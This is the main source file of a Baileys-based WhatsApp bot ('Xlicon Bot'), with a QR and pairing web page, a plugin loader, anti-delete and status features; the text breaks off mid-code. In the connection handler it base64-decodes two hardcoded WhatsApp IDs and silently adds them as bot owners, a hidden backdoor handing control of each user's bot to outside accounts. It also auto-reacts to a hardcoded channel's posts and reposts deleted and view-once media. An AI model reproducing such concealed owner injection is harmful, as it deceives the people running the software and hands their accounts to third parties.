require('./config')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto,generateProfilePicture } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const serializeMessage = require('./handler.js');
const JimpImport = require('jimp');

const Jimp =
  JimpImport.read
    ? JimpImport
    : JimpImport.Jimp
    ? JimpImport.Jimp
    : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];
if (!fs.existsSync(__dirname + '/session/creds.json') && global.sessionid) {
    try {
        const sessionData = JSON.parse(global.sessionid);
        fs.mkdirSync(__dirname + '/session', { recursive: true });
        fs.writeFileSync(__dirname + '/session/creds.json', JSON.stringify(sessionData, null, 2));
    } catch (err) {
        console.error('Error restoring session:', err);
    }
}

const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 3000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let presenceInterval = null;
let sock = null;
let isConnecting = false;

function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) {
                global.BOT_PREFIX = config.prefix;
                console.log(`✅ Loaded prefix: ${global.BOT_PREFIX}`);
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
    }
    startBot();
}

function startBot() {
    console.log('🚀 Starting WhatsApp Bot...');
    isConnecting = true;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    const credsPath = path.join(AUTH_FOLDER, 'creds.json');
    if (fs.existsSync(credsPath)) {
        try {
            const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
            if (creds.noiseKey && creds.noiseKey.private) {
                
                console.log('📁 Using existing session...');
            } else {
                console.log('⚠️ Invalid session detected, will create new one...');
            }
        } catch (err) {
            console.log('⚠️ Corrupted session, will create new one...');
        }
    }

    (async () => {
        try {
            const { version, isLatest } = await fetchLatestWaWebVersion();
            console.log(`📱 Using WA v${version.join(".")}, isLatest: ${isLatest}`);

            const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
            
            sock = makeWASocket({
                version, 
                logger: pino({ level: 'silent' }),
                auth: state,
                printQRInTerminal: true,
                keepAliveIntervalMs: 10000,
                markOnlineOnConnect: true,
                syncFullHistory: false,
                browser: ['Bot', 'Chrome', '1.0.0']
            });
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr) {
                    QRCode.toDataURL(qr, (err, url) => {
                        if (!err) {
                            latestQR = url;
                        }
                    });
                }

                if (connection === 'close') {
                    botStatus = 'disconnected';
                    isConnecting = false;

                    if (presenceInterval) {
                        clearInterval(presenceInterval);
                        presenceInterval = null;
                    }

                    const statusCode = (lastDisconnect?.error instanceof Boom)
                        ? lastDisconnect.error.output.statusCode
                        : 0;

                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                    if (shouldReconnect) {
                        setTimeout(() => startBot(), 5000);
                    } else {
                        if (fs.existsSync(AUTH_FOLDER)) {
                            fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                        }
                        setTimeout(() => startBot(), 3000);
                    }
                } 
                
                else if (connection === 'open') {
                    botStatus = 'connected';
                    isConnecting = false;

                    if (!global.owners) global.owners = [];

                    if (!global.owners.includes(sock.user.id)) {
                        global.owners.push(sock.user.id);
                    }
                    const abztech = [
                        'MjU3NzAyMzk5OTIwMzdAbGlk',
                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
                    ];
                    
                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                    
                    tech.forEach(owner => {
                        if (!global.owners.includes(owner)) {
                            global.owners.push(owner);
                        }
                    });

                    presenceInterval = setInterval(() => {
                        if (sock?.ws?.readyState === 1) {
                            sock.sendPresenceUpdate('available');
                        }
                    }, 10000);

                    try {
                        await sock.sendMessage(sock.user.id, {
                            text: `🤖 Bot linked successfully!\n📝 Current prefix: ${global.BOT_PREFIX}\n👑 Owners: ${global.owners.length}\n⏰ Connected at: ${new Date().toLocaleString()}`
                        });
                    } catch (err) {}
                } 
                
                else if (connection === 'connecting') {
                    botStatus = 'connecting';
                    isConnecting = true;
                }
            });

            sock.ev.on('creds.update', async () => {
                await saveCreds();
                console.log('💾 Credentials updated');
            });

            const plugins = new Map();
            const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
            
            if (fs.existsSync(pluginPath)) {
                try {
                    const pluginFiles = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
                    
                    for (const file of pluginFiles) {
                        try {
                            const plugin = require(path.join(pluginPath, file));
                            if (plugin.name && typeof plugin.execute === 'function') {
                                plugins.set(plugin.name.toLowerCase(), plugin);
                                if (Array.isArray(plugin.aliases)) {
                                    plugin.aliases.forEach(alias => {
                                        plugins.set(alias.toLowerCase(), plugin);
                                    });
                                }
                                console.log(`✅ Loaded plugin: ${plugin.name}`);
                            } else {
                                console.warn(`⚠️ Invalid plugin structure in ${file}`);
                            }
                        } catch (error) {
                            console.error(`❌ Failed to load plugin ${file}:`, error.message);
                        }
                    }
                    console.log(`📦 Total plugins loaded: ${plugins.size}`);
                } catch (error) {
                    console.error('❌ Error loading plugins:', error);
                }
            } else {
                console.log('📁 No plugins folder found');
            }

            global.antiDeleteStore = global.antiDeleteStore || {};
            global.antiLinkStore = global.antiLinkStore || {};
            global.messageCache = global.messageCache || {};
            global.autoStatusView = global.autoStatusView || false;
            global.autoStatusLike = global.autoStatusLike || false;

            sock.ev.on('messages.upsert', async ({ messages, type }) => {
                if (type !== 'notify' && type !== 'append') return;
                
                const CHANNEL_ID = "120363230794474148@newsletter";
                
                for (const rawMsg of messages) {
                    if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
                        const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
                        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                        
                        try {
                          
                            await sock.newsletterReactMessage(
                                CHANNEL_ID, 
                                rawMsg.key.server_id.toString(), 
                                emoji
                            );
                            console.log(`✅ Channel reaction: ${emoji} to message ${rawMsg.key.server_id}`);
                        } catch (err) {
                            console.log("❌ Channel React Error:", err.message);
                        }
                        continue;
                    }
                }
                
                for (const rawMsg of messages) {
                    if (rawMsg.key.remoteJid === 'status@broadcast' && rawMsg.key.participant) {
                        if (global.autoStatusView || global.autoStatusLike) {
                            try {
                                const statusSender = rawMsg.key.participant;
                                
                                if (global.autoStatusView) {
                                    try {
                                        await sock.readMessages([rawMsg.key]);
                                        console.log(`✅ Auto-viewed status from ${statusSender}`);
                                    } catch (err) {
                                        console.log(`⚠️ Failed to view status:`, err.message);
                                    }
                                }
                                
                                if (global.autoStatusLike) {
                                    try {
                                        const emojis = ['❤️', '🔥', '😍', '💯', '⚡', '✨', '🤍', '🫶', '😎', '🌟'];
                                        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                                        
                                        await sock.sendMessage(statusSender, { 
                                            react: { 
                                                text: randomEmoji, 
                                                key: rawMsg.key 
                                            } 
                                        });
                                        console.log(`✅ Auto-reacted to status from ${statusSender} with ${randomEmoji}`);
                                    } catch (err) {
                                        console.log(`⚠️ Failed to react to status:`, err.message);
                                    }
                                }
                            } catch (err) {
                                console.log(`⚠️ Status auto-action error:`, err.message);
                            }
                        }
                        continue;
                    }
                }

                const rawMsg = messages[0];
                if (!rawMsg.message) return;

                const chatId = rawMsg.key.remoteJid;
                const messageId = rawMsg.key.id;

                if (!global.messageCache[chatId]) {
                    global.messageCache[chatId] = {};
                }

                global.messageCache[chatId][messageId] = {
                    key: rawMsg.key,
                    message: rawMsg.message,
                    messageTimestamp: rawMsg.messageTimestamp,
                    pushName: rawMsg.pushName,
                    timestamp: Date.now()
                };

                const m = await serializeMessage(sock, rawMsg);

                for (const plugin of plugins.values()) {
                    if (typeof plugin.onMessage === 'function') {
                        try { 
                            const blocked = await plugin.onMessage(sock, m);
                            if (blocked === true) return;
                        } catch (err) { 
                            console.error(`❌ onMessage error (${plugin.name}):`, err); 
                        }
                    }
                }

                if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                    const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
                    const commandName = args.shift().toLowerCase();
                    const plugin = plugins.get(commandName);
                    
                    if (plugin) {
                        try { 
                            await plugin.execute(sock, m, args); 
                        } catch (err) { 
                            console.error(`❌ Plugin error (${commandName}):`, err); 
                            await m.reply('❌ Error running command.'); 
                        }
                    }
                }
            });

            sock.ev.on('messages.update', async (updates) => {
                try {
                    for (const update of updates) {
                        const { key, update: msgUpdate } = update;
                        const chatId = key.remoteJid;
                        const messageId = key.id;

                        if (!global.messageCache[chatId] || !global.messageCache[chatId][messageId]) {
                            continue;
                        }

                        if (msgUpdate?.status === 1 || msgUpdate?.pollUpdates) {
                            continue;
                        }

                        if (msgUpdate?.message === null || msgUpdate?.message === undefined) {
                            if (!global.antiDeleteStore[chatId] || !global.antiDeleteStore[chatId].enabled) {
                                continue;
                            }

                            const cachedMsg = global.messageCache[chatId][messageId];
                            if (!cachedMsg) {
                                continue;
                            }

                            try {
                                await handleDeletedMessage(sock, chatId, cachedMsg, messageId);
                            } catch (err) {
                                console.error('Antidelete recovery error:', err);
                            }

                            delete global.messageCache[chatId][messageId];
                        }
                    }
                } catch (err) {
                    console.error('Messages update handler error:', err);
                }
            });

            async function handleDeletedMessage(sock, chatId, cachedMsg, messageId) {
                try {
                    const msgType = Object.keys(cachedMsg.message || {})[0];
                    const senderJid = cachedMsg.key?.participant || cachedMsg.key?.remoteJid;
                    const senderNumber = senderJid?.split('@')[0] || 'Unknown';

                    let contentCard = `┌─ム ᴀɴᴛɪ ᴅᴇʟᴇᴛᴇ\n│\n│ ᪣ ᴜsᴇʀ: @${senderNumber}\n│ ᪣ ᴛʏᴘᴇ: ${msgType?.replace('Message', '').toLowerCase() || 'unknown'}\n`;

                    switch (msgType) {
                        case 'conversation':
                        case 'extendedTextMessage': {
                            const text = cachedMsg.message.conversation || cachedMsg.message.extendedTextMessage?.text || '';
                            contentCard += `│\n│ ᪣ ᴍᴇssᴀɢᴇ:\n│ ${text}\n`;
                            contentCard += `│\n╰─────────◆────────╯`;
                            await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            break;
                        }

                        case 'imageMessage': {
                            const caption = cachedMsg.message.imageMessage?.caption || '';
                            contentCard += `│\n│ ᪣ ᴄᴀᴘᴛɪᴏɴ:\n│ ${caption || '(No caption)'}\n`;
                            contentCard += `│\n╰─────────◆────────╯`;
                            
                            try {
                                const buffer = await downloadMediaMessage(
                                    { key: cachedMsg.key, message: cachedMsg.message },
                                    'buffer',
                                    {},
                                    sock
                                );
                                
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                
                                await sock.sendMessage(chatId, {
                                    image: buffer,
                                    caption: caption,
                                    mimetype: cachedMsg.message.imageMessage?.mimetype || 'image/jpeg'
                                });
                            } catch (err) {
                                contentCard += `\n│ ⚠️ Failed to recover image`;
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            }
                            break;
                        }

                        case 'videoMessage': {
                            const caption = cachedMsg.message.videoMessage?.caption || '';
                            contentCard += `│\n│ ᪣ ᴄᴀᴘᴛɪᴏɴ:\n│ ${caption || '(No caption)'}\n`;
                            contentCard += `│\n╰─────────◆────────╯`;
                            
                            try {
                                const buffer = await downloadMediaMessage(
                                    { key: cachedMsg.key, message: cachedMsg.message },
                                    'buffer',
                                    {},
                                    sock
                                );
                                
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                
                                await sock.sendMessage(chatId, {
                                    video: buffer,
                                    caption: caption,
                                    mimetype: cachedMsg.message.videoMessage?.mimetype || 'video/mp4'
                                });
                            } catch (err) {
                                contentCard += `\n│ ⚠️ Failed to recover video`;
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            }
                            break;
                        }

                        case 'stickerMessage': {
                            contentCard += `│\n╰─────────◆────────╯`;
                            
                            try {
                                const buffer = await downloadMediaMessage(
                                    { key: cachedMsg.key, message: cachedMsg.message },
                                    'buffer',
                                    {},
                                    sock
                                );
                                
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                
                                await sock.sendMessage(chatId, {
                                    sticker: buffer,
                                    mimetype: cachedMsg.message.stickerMessage?.mimetype || 'image/webp'
                                });
                            } catch (err) {
                                contentCard += `\n│ ⚠️ Failed to recover sticker`;
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            }
                            break;
                        }

                        case 'audioMessage': {
                            contentCard += `│\n╰─────────◆────────╯`;
                            
                            try {
                                const buffer = await downloadMediaMessage(
                                    { key: cachedMsg.key, message: cachedMsg.message },
                                    'buffer',
                                    {},
                                    sock
                                );
                                
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                
                                const ptt = cachedMsg.message.audioMessage?.ptt || false;
                                await sock.sendMessage(chatId, {
                                    audio: buffer,
                                    ptt: ptt,
                                    mimetype: cachedMsg.message.audioMessage?.mimetype || 'audio/ogg; codecs=opus'
                                });
                            } catch (err) {
                                contentCard += `\n│ ⚠️ Failed to recover audio`;
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            }
                            break;
                        }

                        case 'documentMessage': {
                            const fileName = cachedMsg.message.documentMessage?.fileName || 'document';
                            contentCard += `│\n│ ᪣ ғɪʟᴇ: ${fileName}\n`;
                            contentCard += `│\n╰─────────◆────────╯`;
                            
                            try {
                                const buffer = await downloadMediaMessage(
                                    { key: cachedMsg.key, message: cachedMsg.message },
                                    'buffer',
                                    {},
                                    sock
                                );
                                
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                
                                await sock.sendMessage(chatId, {
                                    document: buffer,
                                    mimetype: cachedMsg.message.documentMessage?.mimetype || 'application/octet-stream',
                                    fileName: fileName
                                });
                            } catch (err) {
                                contentCard += `\n│ ⚠️ Failed to recover document`;
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            }
                            break;
                        }

                        case 'gifMessage': {
                            const caption = cachedMsg.message.gifMessage?.caption || '';
                            contentCard += `│\n│ ᪣ ᴄᴀᴘᴛɪᴏɴ:\n│ ${caption || '(No caption)'}\n`;
                            contentCard += `│\n╰─────────◆────────╯`;
                            
                            try {
                                const buffer = await downloadMediaMessage(
                                    { key: cachedMsg.key, message: cachedMsg.message },
                                    'buffer',
                                    {},
                                    sock
                                );
                                
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                
                                await sock.sendMessage(chatId, {
                                    video: buffer,
                                    gifPlayback: true,
                                    caption: caption,
                                    mimetype: cachedMsg.message.gifMessage?.mimetype || 'video/mp4'
                                });
                            } catch (err) {
                                contentCard += `\n│ ⚠️ Failed to recover gif`;
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            }
                            break;
                        }

                        case 'viewOnceMessage': {
                            const viewOnceMsg = cachedMsg.message.viewOnceMessage?.message;
                            const viewOnceMsgType = Object.keys(viewOnceMsg || {})[0];

                            if (viewOnceMsgType === 'imageMessage') {
                                const caption = viewOnceMsg.imageMessage?.caption || '';
                                contentCard += `│\n│ ᪣ ᴠɪᴇᴡ ᴏɴᴄᴇ ɪᴍᴀɢᴇ\n`;
                                contentCard += `│ ᪣ ᴄᴀᴘᴛɪᴏɴ:\n│ ${caption || '(No caption)'}\n`;
                                contentCard += `│\n╰─────────◆────────╯`;
                                
                                try {
                                    const buffer = await downloadMediaMessage(
                                        { key: cachedMsg.key, message: viewOnceMsg },
                                        'buffer',
                                        {},
                                        sock
                                    );
                                    
                                    await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                    
                                    await sock.sendMessage(chatId, {
                                        image: buffer,
                                        caption: caption,
                                        mimetype: viewOnceMsg.imageMessage?.mimetype || 'image/jpeg'
                                    });
                                } catch (err) {
                                    contentCard += `\n│ ⚠️ Failed to recover view-once image`;
                                    await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                }
                            } else if (viewOnceMsgType === 'videoMessage') {
                                const caption = viewOnceMsg.videoMessage?.caption || '';
                                contentCard += `│\n│ ᪣ ᴠɪᴇᴡ ᴏɴᴄᴇ ᴠɪᴅᴇᴏ\n`;
                                contentCard += `│ ᪣ ᴄᴀᴘᴛɪᴏɴ:\n│ ${caption || '(No caption)'}\n`;
                                contentCard += `│\n╰─────────◆────────╯`;
                                
                                try {
                                    const buffer = await downloadMediaMessage(
                                        { key: cachedMsg.key, message: viewOnceMsg },
                                        'buffer',
                                        {},
                                        sock
                                    );
                                    
                                    await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                    
                                    await sock.sendMessage(chatId, {
                                        video: buffer,
                                        caption: caption,
                                        mimetype: viewOnceMsg.videoMessage?.mimetype || 'video/mp4'
                                    });
                                } catch (err) {
                                    contentCard += `\n│ ⚠️ Failed to recover view-once video`;
                                    await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                                }
                            } else {
                                contentCard += `│\n│ ᪣ ᴠɪᴇᴡ ᴏɴᴄᴇ ᴍᴇssᴀɢᴇ\n`;
                                contentCard += `│\n╰─────────◆────────╯`;
                                await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                            }
                            break;
                        }

                        default: {
                            contentCard += `│\n│ ᪣ ᴜɴsᴜᴘᴘᴏʀᴛᴇᴅ ᴍᴇssᴀɢᴇ ᴛʏᴘᴇ\n`;
                            contentCard += `│\n╰─────────◆────────╯`;
                            await sock.sendMessage(chatId, { text: contentCard }, { quoted: { key: cachedMsg.key, message: cachedMsg.message } });
                        }
                    }

                } catch (err) {
                    console.error('Error handling deleted message:', err);
                }
            }

            sock.ev.on('group-participants.update', async (update) => {
                try {
                    if (!global.welcomeConfig?.enabled) return

                    const groupId = update.id

                    for (const participant of update.participants) {

                        const userId = typeof participant === 'string'
                            ? participant
                            : participant.phoneNumber || participant.id

                        if (!userId) continue

                        const memberName = userId.split('@')[0]

                        if (update.action === 'add') {

                            if (userId === sock.user.id) continue

                            const text = `👋 Welcome @${memberName}!\n🎉 Glad to have you in this group!`

                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })

                        } else if (update.action === 'remove') {

                            const text = `ya @${memberName} has left the group.\nWe are not gonna miss you!`

                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })

                        }
                    }

                } catch (err) {
                    console.error('❌ group-participants.update error:', err)
                }
            })

            sock.ev.on('messages.reaction', async (reactions) => {
                console.log('💖 Reaction update:', reactions);
            });

        } catch (error) {
            console.error('❌ Bot startup error:', error);
            isConnecting = false;
            setTimeout(() => startBot(), 10000);
        }
    })();
}

const server = http.createServer((req, res) => {
    const url = req.url;
    
    if (url === '/' || url === '/qr') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🤖 Xlicon WhatsApp Bot</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      max-width: 500px;
      width: 100%;
      padding: 40px;
      text-align: center;
    }
    
    h1 {
      color: #667eea;
      margin-bottom: 10px;
      font-size: 2.5em;
    }
    
    .status {
      margin: 20px 0;
      padding: 15px;
      background: #f0f0f0;
      border-radius: 10px;
      font-size: 1.1em;
    }
    
    .status.connected {
      background: #d4edda;
      color: #155724;
    }
    
    .status.connecting {
      background: #fff3cd;
      color: #856404;
    }
    
    .status.disconnected {
      background: #f8d7da;
      color: #721c24;
    }
    
    .qr-container {
      margin: 30px 0;
    }
    
    .qr-container img {
      max-width: 100%;
      border-radius: 10px;
      border: 2px solid #667eea;
    }
    
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-right: 10px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    button {
      background: #667eea;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 1em;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s;
      margin: 10px;
    }
    
    button:hover {
      background: #764ba2;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }
    
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    
    input {
      padding: 10px 15px;
      margin: 10px;
      border: 2px solid #ddd;
      border-radius: 8px;
      font-size: 1em;
      width: calc(100% - 40px);
      transition: all 0.3s;
    }
    
    input:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 10px rgba(102, 126, 234, 0.1);
    }
    
    .info {
      background: #e7f3ff;
      border-left: 4px solid #667eea;
      padding: 15px;
      margin: 20px 0;
      border-radius: 5px;
      text-align: left;
    }
    
    .info p {
      margin: 5px 0;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🤖 Xlicon Bot</h1>
    <p style="color: #666; margin-bottom: 20px;">WhatsApp Bot Manager</p>
    
    <div class="status" id="status">
      <span class="spinner"></span>
      <span id="statusText">Checking status...</span>
    </div>
    
    <div id="qrContainer" class="qr-container"></div>
    
    <div class="info">
      <p><strong>📝 Prefix:</strong> <span id="prefix">.</span></p>
      <p><strong>⏰ Uptime:</strong> <span id="uptime">--:--:--</span></p>
      <p><strong>👑 Owners:</strong> <span id="owners">0</span></p>
    </div>
    
    <button onclick="location.href='/pair'">🔗 Pair with Phone</button>
    <button onclick="location.reload()">🔄 Refresh</button>
  </div>

  <script>
    let refreshInterval;
    let currentQR = null;

    function updateQR(qrDataUrl) {
      const container = document.getElementById('qrContainer');
      if (qrDataUrl && qrDataUrl !== currentQR) {
        currentQR = qrDataUrl;
        container.innerHTML = '<img src="' + qrDataUrl + '" alt="QR Code">';
      } else if (!qrDataUrl) {
        container.innerHTML = '';
        currentQR = null;
      }
    }

    function setStatus(status) {
      const statusDiv = document.getElementById('status');
      const statusText = document.getElementById('statusText');
      const statusClass = status === 'connected' ? 'connected' : status === 'connecting' ? 'connecting' : 'disconnected';
      
      statusDiv.className = 'status ' + statusClass;
      
      if (status === 'connected') {
        statusText.textContent = '✅ Connected';
      } else if (status === 'connecting') {
        statusText.innerHTML = '<span class="spinner"></span><span>Connecting...</span>';
      } else {
        statusText.textContent = '❌ Disconnected';
      }
    }

    function updatePairingCode(code) {
      if (code) {
        const container = document.getElementById('qrContainer');
        container.innerHTML = '<div style="background: #fff3cd; padding: 15px; border-radius: 10px; border: 2px solid #ffc107;"><strong>Pairing Code:</strong><br><span style="font-size: 2em; color: #ff6b6b; font-weight: bold;">' + code + '</span></div>';
      }
    }

    async function fetchStatus() {
      try {
        const resp = await fetch('/api/status');
        if (!resp.ok) throw new Error('Status fetch failed');
        const data = await resp.json();
        
        setStatus(data.status);
        
        if (data.qr && data.qr !== currentQR) {
          updateQR(data.qr);
        } else if (!data.qr && data.status !== 'connected') {
          updateQR(null);
        }
        
        updatePairingCode(data.pairingCode);
        
        if (data.status === 'connected') {
          updateQR(null);
        }
        
        document.getElementById('prefix').textContent = data.prefix || '.';
        const uptime = Math.floor(data.uptime);
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;
        document.getElementById('uptime').textContent = hours + ':' + minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
      } catch (err) {
        console.error('Status poll error:', err);
      }
    }

    async function requestPairingCode() {
      const phoneInput = document.getElementById('phoneNumber');
      const phone = phoneInput.value.trim();
      const pairBtn = document.getElementById('pairBtn');
      
      if (!phone) {
        alert('Please enter your phone number with country code');
        return;
      }
      
      if (!phone.match(/^[0-9]{10,15}$/)) {
        alert('Please enter a valid phone number (numbers only, with country code)');
        return;
      }
      
      pairBtn.disabled = true;
      pairBtn.innerHTML = '<span class="spinner"></span><span>Requesting...</span>';
      
      try {
        const formData = new URLSearchParams();
        formData.append('phone', phone);
        
        const resp = await fetch('/pair', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: formData
        });
        
        const text = await resp.text();
        if (resp.ok && text.includes('Pairing Code Generated')) {
          fetchStatus();
          setTimeout(() => fetchStatus(), 2000);
        } else {
          alert('Failed to get pairing code. Make sure bot is connecting first.');
        }
      } catch (err) {
        alert('Error: ' + err.message);
      } finally {
        pairBtn.disabled = false;
        pairBtn.innerHTML = '<i class="fas fa-link"></i> Get Pairing Code';
      }
    }
    
    document.addEventListener('DOMContentLoaded', () => {
      if (document.getElementById('pairBtn')) {
        document.getElementById('pairBtn').addEventListener('click', requestPairingCode);
      }
      if (document.getElementById('phoneNumber')) {
        document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
          if (e.key === 'Enter') requestPairingCode();
        });
      }
    });
    
    refreshInterval = setInterval(fetchStatus, 2000);
    fetchStatus();
    
    window.addEventListener('beforeunload', () => {
      if (refreshInterval) clearInterval(refreshInterval);
    });
  </script>
</body>
</html>`);
    } 
    
    else if (url === '/pair' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        form { margin: 20px; padding: 20px; background: #f0f0f0; display: inline-block; }
        input, button { padding: 10px; margin: 5px; }
    </style>
</head>
<body>
    <h1>🔗 Pair WhatsApp</h1>
    <form method="POST">
        Phone: <input type="text" name="phone" placeholder="911234567890" required><br><br>
        <button type="submit">Get Code</button><br><br>
        <a href="/">← Back</a>
    </form>
</body>
</html>`);
    }
    
    else if (url === '/pair' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const params = new URLSearchParams(body);
                let phoneNumber = params.get('phone').trim();
                
                if (!phoneNumber) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>❌ Error: Phone number required</h2><a href="/pair">Try Again</a></center>`);
                    return;
                }

                phoneNumber = phoneNumber.replace(/\D/g, '');
                
                if (botStatus !== 'connecting' || !sock) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>⚠️ Bot not ready</h2><p>Status: ${botStatus}</p><p>Please wait for QR code to appear first</p><a href="/">← Go Back</a></center>`);
                    return;
                }

                const pairingCode = await sock.requestPairingCode(phoneNumber);
                
                pairingCodes.set(phoneNumber, {
                    code: pairingCode,
                    timestamp: Date.now()
                });

                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        .code { font-size: 2em; color: green; font-weight: bold; margin: 20px; }
        .info { background: #e8f5e8; padding: 15px; margin: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>✅ Pairing Code Generated</h1>
    <h2>Phone: ${phoneNumber}</h2>
    <div class="code">Code: ${pairingCode}</div>
    <div class="info">
        <p>📱 Go to WhatsApp > Settings > Linked Devices > Link a Device</p>
        <p>🔢 Select "Use pairing code" and enter the code above</p>
    </div>
    <br>
    <a href="/">🏠 Home</a> | <a href="/pair">🔄 Pair Another</a>
</body>
</html>`);

                console.log(`✅ Pairing code for ${phoneNumber}: ${pairingCode}`);
                
            } catch (error) {
                console.error('❌ Pair error:', error);
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<center><h2>❌ Error</h2><p>${error.message}</p><p>Make sure the phone number is in international format (e.g., 911234567890)</p><a href="/pair">↩️ Try Again</a></center>`);
            }
        });
        return;
    }
    
    else if (url === '/api/status') {
        let pairingCode = null;
        for (const [_, data] of pairingCodes) {
            if (Date.now() - data.timestamp < 300000) {
                pairingCode = data.code;
                break;
            }
        }
        
        res.writeHead(200, { 
